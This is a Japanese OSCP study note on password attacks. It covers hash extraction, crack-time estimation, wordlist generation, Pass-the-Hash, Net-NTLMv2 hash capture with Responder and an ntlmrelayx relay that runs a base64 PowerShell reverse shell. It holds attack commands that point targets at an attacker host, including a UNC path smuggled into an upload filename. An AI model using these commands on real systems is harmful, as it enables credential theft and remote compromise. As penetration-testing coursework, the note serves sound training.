- 関連ノート：
	- [🐉THC-Hydra](../../Tools/🐉THC-Hydra.md)
	- [🐈‍⬛Password Crack - JtR・Hashcat](../../Tools/🐈‍⬛Password%20Crack%20-%20JtR・Hashcat.md)
	- [💥AD認証システムの攻撃](../🪟Windows/Active%20Directory/💥AD認証システムの攻撃.md#Password%20Spray)
	- [コースの一般的な情報や特殊コマンド](../../PEN-200/コースの一般的な情報や特殊コマンド.md#⭐️28.2.6.%20パスワード攻撃について)

---

# 総当たり・辞書攻撃

- [🐉THC-Hydra](../../Tools/🐉THC-Hydra.md)などのツールを使用して実行
- 実行前に、**まずはデフォルトクレデンシャルや、パスワードなしの認証、簡易的なパスワードを試すこと**

---

# Password Crackingメソドロジー

- メソドロジー：
	1. Hashの抽出
	2. Hashのフォーマット化
	3. クラッキング所要時間の計算(ブルートフォースの場合)
	4. ワードリストの準備
	5. Hashの攻撃

## 1. Hashの抽出

### 実例：パスワードマネージャー

1. ターゲットのWindowsマシンが、どのパスワードマネージャーを使用しているか明らかにする
	- CLI：[インストール済みアプリケーションの列挙](../🪟Windows/🔍Windows%20Local%20Enumeration.md#インストール済みアプリケーションの列挙)
	- GUI：設定 > Apps > Apps & features

2. パスワードマネージャーのdbファイルを検索（ここではKeePassとする）
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
- それぞれのパスワードマネージャーのdbファイルの名称はググる

### 実例：SSHパスフレーズ

- SSHの秘密鍵で接続しようとすると、パスフレーズの入力を求められる
- `id_rsa`からHashを抽出し、クラックする
- 外部から入手した`id_rsa`ファイルには、読み・書き権限を付与すること
```zsh
chmod 600 id_rsa
```

## 2. Hashのフォーマット化

- まずはHashアルゴリズムを識別する必要がある：
	- [Hashの識別](../../Tools/🐈‍⬛Password%20Crack%20-%20JtR・Hashcat.md#Hashの識別)

- sshパスフレーズ、zip、rar、/etc/shadowなど、必要に応じてフォーマットツールを使いフォーマット化する：
	- [ハッシュ値の整形](../../Tools/🐈‍⬛Password%20Crack%20-%20JtR・Hashcat.md#ハッシュ値の整形)

## 3. クラッキング所要時間の計算

目的は、限られた時間の中で、**総当たりの**クラッキングが終わりそうかを判断すること。
終わらないのであれば、==別の攻撃ベクターを模索する。==
※標準的なサイズのワードリストを用いた辞書攻撃であれば、計算不要

以下の手順をスキップして、Hashcatでクラッキングを走らせ、statusを表示する方法もある。

![](../../Images/Pasted%20image%2020250720131350.png)

$$所用推定時間$$

### 3-1. Key Space（※）を求める

- （※）指定可能な文字の組合せ数（文字の数^文字長）

1. 文字の数を算出
```zsh
# echo -n "[文字種(abcdefg等]" | wc -c
echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
```
	↓
```zsh
62
```

2. Key Spaceの算出
```zsh
# python3 -c "print(文字の種類の数**文字長)"
python3 -c "print(62**5)"
```
	↓
```zsh
916132832
```

### 3-2. HWのハッシュクラックの性能を確認

- HWごとに結果は変わる
- Hashアルゴリズムごとに結果は変わる

- Hashcatのベンチマークモードでそれぞれのハッシュアルゴリズムが何MH/s（※）必要か確認
```zsh
hashcat -b
```
	 ↓
```zsh
hashcat (v6.2.5) starting in benchmark mode
...
* Device #1: pthread-Intel(R) Core(TM) i9-10885H CPU @ 2.40GHz, 1545/3154 MB (512 MB allocatable), 4MCU

Benchmark relevant options:
===========================
* --optimized-kernel-enable

-------------------
* Hash-Mode 0 (MD5)
-------------------

Speed.#1.........:   450.8 MH/s (2.19ms) @ Accel:256 Loops:1024 Thr:1 Vec:8

----------------------
* Hash-Mode 100 (SHA1)
----------------------

Speed.#1.........:   298.3 MH/s (3.22ms) @ Accel:256 Loops:1024 Thr:1 Vec:8

---------------------------
* Hash-Mode 1400 (SHA2-256)
---------------------------

Speed.#1.........:   134.2 MH/s (7.63ms) @ Accel:256 Loops:1024 Thr:1 Vec:8
```
- （※）1 MH/s = 1,000,000 ハッシュ / 秒

### 3-3. 所要時間を計算する

- 基本シンタックス
	- 秒単位の結果が返る
```zsh
python3 -c "print(<Key_Space> / <MH/s>)"
```

- 具体例：Hash-Mode 1400 (SHA2-256)
```zsh
python3 -c "print(916132832 / 134200000)"
6.826623189269746
```

#### 補足：「文字長を大きくする」のと「文字種を増やす」のはどちらがセキュアか

- 文字種を増やすより、文字長を大きくするほうが、パスワードのパターンが指数関数的に増加するので、より安全

- ① 文字の種類を増やす（複雑にする）場合
	- たとえば、8文字のパスワードで：
	- 英小文字（26種類）だけなら：26⁸ ≈ 2×10¹¹通り
	- 英大文字・数字・記号も入れて94種類なら：94⁸ ≈ 6×10¹⁵通り
→文字の種類を68増やしても、29,000倍しかパターンが増えない

- ^ ② 長さを大きくする（例：8文字→10文字）
	- 94種類の文字を使うとして：
	- 8文字：94⁸ ≈ 6×10¹⁵通り
	- 10文字：94¹⁰ ≈ 5×10¹⁹通り
→ 文字の長さを2つ大きくしただけで、約8,000倍も増加

---

## 4. ワードリストの準備

- 単純な辞書攻撃よりも、ルールベースの攻撃（wordlistの変形）を実施すべき
	- パスワードポリシー（例：8文字以上、記号含むなど）を調査する
	- 既知の漏洩パスワード（例：Have I Been Pwned など）を調べてリストに追加する
- 適切なワードリストを使うことがパスワードアタック成功の鍵

### 漏洩・デフォルトパスワードの使用

- Default Password：
	- スイッチやルーターなどの機器には、メーカー設定のデフォルトパスワードが存在する
	- 対象のソフトウェアやハードウェアに応じて、既知のデフォルトパスワードを試す

- Weak Password：
	- 長年収集されたパスワードを1つにまとめたワードリストが存在
	- 例：SecListsのパスワードリスト

- Leaked Password：
	- 攻撃や漏洩により公開・販売されたパスワードやハッシュのリスト
	- ハッシュのみの場合はクラッキングが必要

#### 漏洩・デフォルトパスワード集リンク🔗

- 漏洩パスワードの販売（合法）：[Scattered Secrets](https://scatteredsecrets.com/)
- [Default Passwords - CIRT.net](https://cirt.net/passwords?criteria=smartermail)
- [Default Passwords - Datarecovery.com](https://datarecovery.com/rd/default-passwords/)
- [Default Passwords - default password.info](https://default-password.info/)
- [SecLists/Passwords/Leaked-Databases](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases)

### ワードリストの連結

```zsh
cat file1.txt file2.txt > combined.txt
# 重複の削除
sort combined.txt | uniq -u > cleaned_list.txt
```

### ワードリストの改変

- [ワードリストの改変 w/ Hashcat](../../Tools/🐈‍⬛Password%20Crack%20-%20JtR・Hashcat.md#ワードリストの改変%20w/%20Hashcat)
- [ワードリストの改変 w/ JtR](../../Tools/🐈‍⬛Password%20Crack%20-%20JtR・Hashcat.md#ワードリストの改変%20w/%20JtR)

### ワードリストの生成

- *cewl*：企業のWebサイトやサービス名、従業員名などから単語を抽出しワードリストを生成
```zsh
cewl -w <output> -d 5 -m <最小値> https://<target_IP>

# メールアドレスは抽出してemails.txtに、それ以外はcewl.txtに保存
cewl -e --email_file emails.txt -m 5 -w cewl.txt http://<target_IP>
```
- `-d`：クローリングの深さのレベル
- `-m`：文字の長さの最小値

#### Usernameワードリストの生成

- 情報収集のフェーズで、ターゲット企業の従業員の名前などを集めることは必須
- 集めたターゲットの従業員名などからユーザー名を生成する
- 🔗[username_generater](https://github.com/shroudri/username_generator)を使う
```zsh
# wget https://raw.githubusercontent.com/shroudri/username_generator/refs/heads/main/username_generator.py
echo "Suzuki Taro" > users.lst
python3 username_generator.py -w users.lst
```

![ 500](../../Images/Pasted%20image%2020230611195317.png)

$$username生成例$$

#### Keyspaceテクニック

- Keyspace: 文字、数字、記号など、パスワードや秘密情報に使用される可能性のあるすべての要素を含む可能性のある組み合わせ

- crunch：ワードリストを作成するためのツール
```zsh
crunch <min_char_length> <max_char_length> -t <文字セット> -o <output>
```
- 例：
```zsh
crunch 6 6 -t pass%% -o output.txt
```
	↓
```
pass00
pass01
pass02
pass03
```

| 記号     | 意味           |
| ------ | ------------ |
| `%`    | 数字（`0-9`）    |
| `@`    | 小文字（`a-z`）   |
| `,`    | 大文字（`A-Z`）   |
| その他の文字 | その文字自体が候補になる |

#### CUPP（Common User Password Profiler）

- 質問に答えてワードリストを生成
```zsh
python3 cupp.py -i
```

- 事前定義されたワードリストの取得
```zsh
python3 cupp.py -l
```

- alectdb(デフォルトユーザー名・パスワードのリスト）からの取得
```zsh
python3 cupp.py -a
```

---

## 5. Hashの攻撃

- [🐈‍⬛Password Crack - JtR・Hashcat](../../Tools/🐈‍⬛Password%20Crack%20-%20JtR・Hashcat.md)でクラックする
- パスワードが複雑でクラックできない場合は、PtHやrelay攻撃に展開する
	- [Password Hashを用いた攻撃](#Password%20Hashを用いた攻撃)

---
---

# Password Hashを用いた攻撃

- 前提知識：
	- [NTLM周りの用語](../../Misc/用語.md#NTLM周りの用語)
	- [NTLM](../🪟Windows/Active%20Directory/ADの基本.md#NTLM)

## NTLM Hashのクラッキング

1. [認証情報の抽出](../../Tools/🥝Mimikatz.md#認証情報の抽出) 
2. [🐈‍⬛Hashcat](../../Tools/🐈‍⬛Password%20Crack%20-%20JtR・Hashcat.md#🐈‍⬛Hashcat)

---

## PtH

- ハッシュが複雑で成功しない場合、かつ、同じパスワードを使用するアカウントが存在するだろう場合に検討：[PtH (Pass-the-Hash)](../🪟Windows/Active%20Directory/💥Lateral%20Movement%20&%20Persistance%20in%20AD.md#PtH%20(Pass-the-Hash))

---

## Net-NTLMv2のクラッキング

Windows環境で<u>獲得したユーザーが非特権アカウントであるとき</u>に検討する攻撃手法。
参考🔗：[Proving Grounds Practice write-up - Vault](https://medium.com/@Dpsypher/proving-grounds-practice-vault-158516460860)

- 条件：
	- シェルを獲得できずコード実行ができない場合でも、Windowsサーバーへファイルアップロードが可能なWebアプリケーションを発見したとき
	- S MBサーバーにファイルアップロードが可能なとき

### Net-NTLMv2クラッキング概要

- ユーザーの権限が低く、MimikatzなどでパスワードやNTLMハッシュをダンプできなくても、Net-NTLMv2認証プロトコルを悪用して、ハッシュを取得 → クラックし、パスワードを得る

1. 攻撃者側で🔗[Responder](https://github.com/lgandx/Responder)を用意する
	- SMB, HTTP, FTP, LLMNR, NBT-NS, MDNSなど、さまざまなプロトコルをサポートしている
2. ターゲットにSMB接続などを実行させ、攻撃者のResponderに認証をさせる
3. 認証過程でNet-NTLMv2ハッシュが送られてくる
4. ハッシュをクラックする

### Net-NTLMv2クラッキング手順

1. 攻撃者側でResponderを用意する
```zsh
sudo responder -I <interface(tun0等)>
```

2. ターゲットに攻撃者のResponderへNet-NTLMv2認証をさせる
- 方法A：ターゲットシェルを獲得し、ターゲット上から攻撃者上の存在しないSMB共有にアクセスさせる
```powershell
dir \\<attacker_IP>\hoge
```

・方法B : WebアプリでRFIの脆弱性を利用して、ターゲットから攻撃者上の存在しないSMB共有にアクセスさせる
```sh
http://example/page=//<attacker_IP>/hoge
```

- 方法C：Webアプリでファイルアップロードし、攻撃者上の存在しないSMB共有にアクセスさせる
	- ⚠️ファイルアップロード機能が==SMBを介して可能である場合に==成功する
	- Burp Suiteなどでfilenameパラメタを以下の値に変更してリクエストする
```
\\\\<attacker_IP>\hoge\hoge.txt
```

![](../../Images/Pasted%20image%2020250720111345.png)

$$filenameパラメタの値を攻撃者のIPを指すUNCパスに変更$$

3. 攻撃者のResponderを確認し、ハッシュを取得したことを確認

4. ハッシュのクラック

>[!NOTE]
>- キャプチャしたとき、Skipping previously captured hash for...とある場合は、`/usr/share/responder/logs/`に記録された結果を確認するか、Responderに`-v`を追加
>- 複数のNTLMv2 Hashをキャプチャすると思うが、クラック対象はどれでもいい（一番最初のでいい）
>- Responderをスタートしたとき、`Error starting UDP server on port 5355` もしくは `Error starting UDP server on port 5353`と表示されるのに、`netstat`で当該ポート番号が確認できない
>	- →Kali を再起動してから再度 Responder を起動

---

## Net-NTLMv2のリレーアタック

### シチュエーション

 [Net-NTLMv2のクラッキング](#Net-NTLMv2のクラッキング)でクラックできなかった場合に検討する攻撃手法。

- 条件：
	- [PtH成功条件](../🪟Windows/Active%20Directory/💥Lateral%20Movement%20&%20Persistance%20in%20AD.md#PtH成功条件)を満たす
	- SMB singningが無効である

### Net-NTLMv2リレーアタック手順

1. PowerShellのリバースシェルワンライナーを用意する：[Base64化したPowerShellリバースシェルワンライナー](Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#Base64化したPowerShellリバースシェルワンライナー)

2. 攻撃者マシン上でntlmrelayxを起動
```zsh
impacket-ntlmrelayx --no-http-server -smb2support -t <target_IP> -c "powershell -enc <base64_encoded_payload>"
```
- `<target_IP>`に設定するIPは、リレー先のもの（リレー元ではない）

3. リバースシェルリスナーを用意
```zsh
sudo rlwrap nc -lvnp <port>
```

4. ターゲット上から攻撃者のResponderにNet-NTLMv2認証をさせる
	- 方法は[Net-NTLMv2クラッキング手順](#Net-NTLMv2クラッキング手順)のステップ2参照

5. リバースシェル獲得

---
---

# Windows Credential Guardの仕組みとその回避

## Windows Credential Guardの仕組み

### Credential Guardの前提知識

- [LSA](../../Misc/用語.md#LSA)

#### Virtualization-based Security (VBS) 概要

- VBSとは？  
    CPUが持つハードウェア仮想化機能を活用し、OS内に隔離された安全なメモリ領域を作成するソフトウェア技術
    
- 実装方法
    - MicrosoftのHyper-V上で動作
    - Virtual Secure Mode（VSM）と呼ばれる機能を使い、特定のメモリ領域を分離・保護

#### VSM（Virtual Secure Mode）の仕組み

- Hyper-Vのパーティション機能の一部
- 主にメモリの分離を実施し、機密情報を通常のカーネルやSYSTEM権限でもアクセス不可能な領域に保存する
- Virtual Trust Levels (VTLs) ：VTLは「仮想的な特権レベル」で、0-15まである（レベルが高いほど権限が高い）
- 現在は以下の２つが使われている    
    - VTL0（Normal Mode）：通常のWindows環境（ユーザープロセスやカーネル含む）
    - VTL1（Secure Mode）：機密機能を担う隔離環境で、
        - VTL1内のユーザーモード＝*Isolated User-Mode (IUM)*
        - IUMプロセス＝Trusted Processes / Secure Processes / Trustlets（信頼されたプロセス）

#### セキュリティ機能と利用例

- VSMは以下のようなセキュリティ機能の基盤技術として使われる：
    - Device Guard
    - 仮想TPM（vTPM）
    - **Credential Guard**

- VSMの導入状況について
    - Windows 10 / Server 2016から搭載されたが当初はデフォルト無効だった
    - 現在のWindowsではデフォルトで有効（ただし、アップグレードしただけでは==以前の設定が引き継がれる==）。

### Credential Guard の動作と影響

- Credential Guardが有効な場合：
    - `LSASS.exe`（VTL0）とは別に、`LSAISO.exe`がVTL1のtrustletとして動作(互いにRPCでやり取り)
    - クレデンシャルは `LSAISO.exe` 側に保存される
    - そのため、Mimikatzなどのツールでは<u>LSASSから直接資格情報を取得できない</u>
    - (結果に、` * LSA Isolated Data: NtlmHash`と表示されるだけ)

- 保護範囲
    - ドメインユーザーなど**非**ローカルユーザーの認証情報を保護
    - ==ローカルアカウントではVSMが動作していないので、依然としてMimikatzで取得可能==

### 認証処理の概要とSSPの悪用

- Windows認証の主な仕組み
    - LSA
    - Winlogon（Windows最初のログイン画面で裏で動くプロセス）
    - SSPI（Security Support Provider Interface）

- SSPIの役割：  
    認証が必要なとき、LSAがSSPIを通じて適切なSSPを呼び出して認証処理を実施。（すべてのアプリケーション・サービスの認証に使われる）
    - 例：Kerberos SSP、NTLM SSP などがDLLとして組み込まれている。
    - SSPはセキュリティを担うDLL

- ==SSPは複数追加可能==
    - `AddSecurityPackage` APIを使う。
    - または以下のレジストリキーにSSP名を追記：  
	- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages`

---

## Windows Credential Guardの回避

[Credential Guardを回避してパスワード窃取](../../Tools/🥝Mimikatz.md#Credential%20Guardを回避してパスワード窃取)

---
---

# Misc

## パスワード設定における人の脆弱性

- 特殊文字はキーボード左側にある、`!@#$%`が使われがち
	- 🔗[Research - The Washington Post](https://www.washingtonpost.com/national/health-science/you-added--or-1-to-your-password-thinking-this-made-it-strong-science-says-no/2017/09/08/0f244e2a-9260-11e7-89fa-bb822a46da5b_story.html)
- 大文字にする必要がある場合は、先頭文字を大文字にしがち
- 特殊文字は末尾にしがち
- パスワードのパターンはなかなか変わらない
	- 漏洩済みパスワードから少し改変しただけのものが使われている

## OSCP試験におけるPassword Attacks

- 標準的なスペックのマシンで、クラック試行に5分以上かかる場合
	- →そもそもパスワードアタックは適切なアタックベクターではない(数分で終わるように設計されている)
	- →適切なワードリストではない
